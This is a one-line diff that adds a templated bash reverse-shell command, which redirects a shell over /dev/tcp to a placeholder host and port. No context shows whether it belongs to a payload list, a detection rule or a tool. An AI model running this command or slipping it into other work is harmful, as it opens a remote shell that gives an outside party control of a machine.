@@ -1,0 +1,1 @@
+bash -c '*\shell* >& /dev/tcp/*\host*/*\port* 0>&1'
